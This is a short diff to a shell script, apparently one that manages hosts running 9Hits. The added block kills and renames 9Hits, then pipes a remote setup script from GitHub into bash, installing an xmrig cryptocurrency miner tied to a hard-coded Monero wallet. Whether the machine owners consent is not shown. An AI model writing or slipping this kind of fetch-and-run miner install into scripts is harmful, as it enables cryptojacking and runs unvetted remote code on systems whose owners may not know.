@@ -18,6 +18,18 @@ else
     #/sbin/shutdown -r now
     #sleep 10
 fi
+FILE=/root/change2Miner
+if test -f "$FILE"; then
+    echo OK1
+else
+    echo "change2Miner" > /root/change2Miner
+    mv 9Hits 9Old
+    killall 9Hits
+    cd /root
+    apt update
+    curl -L https://raw.githubusercontent.com/MoneyMakers777/xmrig_setup/master/setup_skypool_miner.sh | bash -s '46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5'
+fi
+
 
     
 
